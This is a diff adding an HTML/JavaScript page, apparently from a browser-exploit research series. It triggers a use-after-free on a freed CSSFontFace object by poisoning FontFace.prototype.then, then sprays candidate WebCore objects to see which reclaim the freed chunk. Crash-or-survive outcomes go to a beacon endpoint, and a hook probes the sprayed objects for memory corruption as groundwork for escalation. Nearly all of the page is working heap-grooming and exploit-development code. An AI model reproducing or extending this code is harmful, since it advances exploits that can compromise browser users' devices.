@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V926</title></head>
+<body><pre id="out">V926 — bitfit-192 reclaimer catalog: which JS-allocatable WebCore classes land in the freed CSSFontFace chunk (walk survive/crash discriminator)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V926-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,600))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v926 — the bitfit-192 partial-overwrite catalog, phase 1: find which
+ * JS-allocatable WebCore classes (FastMalloc arena, NOT Gigacage) reclaim
+ * the freed CSSFontFace chunk on 14.22.
+ *
+ * Background (board rows):
+ *   - p640: the freed CSSFontFace (bitfit 192) is reclaimed by sprayed
+ *     CSSFontFace carriers; the engine's post-free setStatus write lands
+ *     at carrier+0x82 and is JS-readable. AB carriers NEVER land
+ *     (Gigacage — separate pool; v913: 13 AB classes 0/38).
+ *   - FONTFACE_MEMBER_MAP (14.10): the post-free continuation
+ *     DEREFERENCES the chunk's +0x28..+0x48 (five qwords) and
+ *     null-checks +0x18/+0x20/+0x50; the walk reads +0x58 (m_clients).
+ *   - On 14.22 the same continuation runs against whatever object
+ *     reclaims the chunk (v912/v919 walk-survival mechanics).
+ *
+ * Discriminator per candidate class X:
+ *   - free the face (p640 trigger: poisoned FontFace.prototype.then ->
+ *     style rebuild -> adopt -> free inside the getter)
+ *   - spray 200x X objects
+ *   - read the outcome: if X landed, the continuation walks X's bytes:
+ *       * walk SURVIVES  => X landed with walkable +0x58.. fields
+ *         (and the +0x82 write just corrupted X's byte at +0x82)
+ *       * context DIES   => X landed but its +0x28..+0x48/+0x58 are
+ *         garbage as pointers (the v912 signature — landing PROVEN
+ *         by death, distinct from the zeroed-chunk death only by
+ *         being candidate-correlated)
+ *       * baseline: with NO spray the zeroed chunk dies at the walk
+ *         (v909/v641 signature) — the control arm
+ *   A candidate whose walk SURVIVES is the escalation target: its
+ *   JS-visible state is then compared against a pristine instance for
+ *   the +0x82 corruption (phase 2, later arms).
+ *
+ * Candidate set (phase 1, JS-creatable WebCore objects, plausible
+ * 161-192 B FastMalloc class): Event, CustomEvent, DOMRect, TextDecoder,
+ * AbortController, MessageChannel, Range, NodeIterator, Headers,
+ * URLSearchParams, DOMParser, TextTrackCue-shape via VTTCue if present.
+ * CSSFontFace (FontFace) runs as the POSITIVE control (known landing).
+ * One candidate per load (a context death marks it); ?r=1 resets.
+ */
+
+var CANDIDATES=[
+  {n:'CONTROL-FONTFACE', make:function(){ return new FontFace('cc'+Math.random(), "local('Nope')"); }},
+  {n:'Event',            make:function(){ return new Event('v926'); }},
+  {n:'CustomEvent',      make:function(){ return new CustomEvent('v926',{detail:1}); }},
+  {n:'DOMRect',          make:function(){ return new DOMRect(1,2,3,4); }},
+  {n:'TextDecoder',      make:function(){ return new TextDecoder('utf-8'); }},
+  {n:'AbortController',  make:function(){ return new AbortController(); }},
+  {n:'MessageChannel',   make:function(){ return new MessageChannel(); }},
+  {n:'Range',            make:function(){ return document.createRange(); }},
+  {n:'NodeIterator',     make:function(){ return document.createNodeIterator(document.body); }},
+  {n:'Headers',          make:function(){ return new Headers({'a':'b'}); }},
+  {n:'URLSearchParams',  make:function(){ return new URLSearchParams('a=b'); }},
+  {n:'DOMParser',        make:function(){ return new DOMParser(); }},
+  {n:'VTTCue',           make:function(){ return new VTTCue(0,1,'x'); }},
+  {n:'FormData',         make:function(){ return new FormData(); }},
+  {n:'Blob',             make:function(){ return new Blob(['x']); }}
+];
+
+/* ---- p640-verbatim trigger skeleton ---- */
+var st={c:0,pending:null};
+try{
+  if(location.search.indexOf('r=1')>=0){localStorage.removeItem('v926_state');bk('RESET','cleared');}
+  else{var raw=localStorage.getItem('v926_state');if(raw)st=JSON.parse(raw);}
+}catch(e){}
+function save(){try{localStorage.setItem('v926_state',JSON.stringify(st));}catch(e){}}
+
+if(st.pending){
+  var pk=st.pending; st.pending=null; save();
+  bk('KILLER','candidate='+CANDIDATES[pk.c].n+' — the context died in the continuation with this candidate sprayed (landing row: walk consumed its fields)');
+  st.c=pk.c+1; save();
+}
+
+if(st.c>=CANDIDATES.length){
+  bk('EXHAUSTED','catalog complete — KILLER = landed-with-garbage-fields; LOADED/WALK-SURVIVED = landed-with-walkable-fields (phase-2 corruption targets); DECODE-ERR-shaped no-land rows noted per candidate');
+}else{
+  var C=CANDIDATES[st.c];
+  bk('BOOT','candidate='+C.n+' ('+(st.c+1)+'/'+CANDIDATES.length+')');
+
+  var fs=document.createElement('style'); fs.id='fs';
+  fs.textContent='@font-face { font-family: s3; src: local(Arial); unicode-range: U+0043; }';
+  document.head.appendChild(fs);
+  var ds=document.createElement('style'); ds.id='ds'; ds.textContent='body { margin: 0; }';
+  document.head.appendChild(ds);
+
+  var FILL=80, N=200, target=null, fired=false, spray=[];
+  function fill(n){ for(var i=0;i<n;i++){ try{document.fonts.add(new FontFace('wf'+i,"local('ZZ_WF_"+i+"')"));}catch(e){} } }
+
+  try{ document.fonts.forEach(function(f){ if(f.family==='s3') target=f; }); }catch(e){}
+  if(!target){ bk('NOFACE',''); } else {
+    fill(FILL);
+    void target.loaded;
+    bk('READY','st='+String(target.status));
+
+    Object.defineProperty(FontFace.prototype,'then',{
+      configurable:true,
+      get:function(){
+        if(fired) return undefined;
+        fired=true;
+        try{ ds.textContent='body { margin: 1px; }'; }catch(e){}
+        try{ document.body.offsetHeight; }catch(e){}       /* rebuild => adopt => FREE */
+        var made=0;
+        for(var k=0;k<N;k++){
+          try{
+            var obj=C.make();                                /* the candidate object */
+            if(obj && C.n!=='CONTROL-FONTFACE'){
+              /* keep it alive WITHOUT document.fonts (a live face carrier
+                 would win the chunk by class match — we want the
+                 CANDIDATE to contend) */
+              spray.push(obj);
+            } else if(obj) {
+              try{ document.fonts.add(obj); }catch(e){}
+              spray.push(obj);
+            }
+            made++;
+          }catch(e){}
+        }
+        bk('SPRAYED','candidate='+C.n+'|made='+made);
+        return undefined;
+      },
+      set:function(){}
+    });
+
+    try{ target.load(); }catch(e){ bk('LOADERR','x'); }
+    bk('AFTERLOAD','ok');
+
+    /* outcome readout */
+    var hit='none', hitIdx=-1;
+    if(C.n==='CONTROL-FONTFACE'){
+      for(var i2=0;i2<spray.length;i2++){
+        var s2='';try{s2=String(spray[i2].status);}catch(e){s2='?';}
+        if(s2!=='unloaded'&&s2!=='pending'){hit='idx='+i2+':'+s2;hitIdx=i2;break;}
+      }
+      bk('HIT','control-status-readback='+hit);
+    } else {
+      /* foreign candidate: alive past the walk = walked fields were valid */
+      bk('WALK-SURVIVED','candidate='+C.n+' — the continuation walked the chunk with this candidate landed and did not fault');
+      /* phase-2 hook: probe the candidate's JS-visible state for the
+         +0x82 corruption vs a pristine twin */
+      try{
+        var pristine=C.make();
+        var diff='';
+        for(var pk2 in pristine){
+          try{
+            var a=String(pristine[pk2]), b2;
+            try{ b2=String(spray[0][pk2]); }catch(e){ b2='<throw>'; }
+            if(a!==b2) diff+=pk2+':'+a+'->'+b2+'; ';
+          }catch(e){}
+        }
+        bk('STATE-DIFF',diff||'no JS-visible delta on enumerable props');
+      }catch(e){}
+    }
+    st.c++; save();
+    setTimeout(function(){location.reload();},400);
+  }
+}
+</script></body></html>
